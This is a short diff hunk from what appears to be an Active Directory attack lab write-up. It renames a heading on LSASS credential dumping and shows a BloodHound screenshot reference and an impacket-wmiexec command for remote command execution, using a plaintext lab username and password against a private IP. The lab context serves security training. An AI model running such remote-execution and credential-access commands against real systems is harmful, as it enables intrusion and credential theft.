@@ -60,7 +60,7 @@ User with Replicating Rights
 
 ![bloodhound4](/Sandbox_SecurityLab_1/block1-attacks/src/RepRights_user.jpg)
 
-### LSASS Credential Dumping
+### Workstation Credential Access — LSASS
 Remote Command Execution (RCE) via WMI
 ```bash
 impacket-wmiexec 'Steve:Qwerty12345@192.168.100.100'
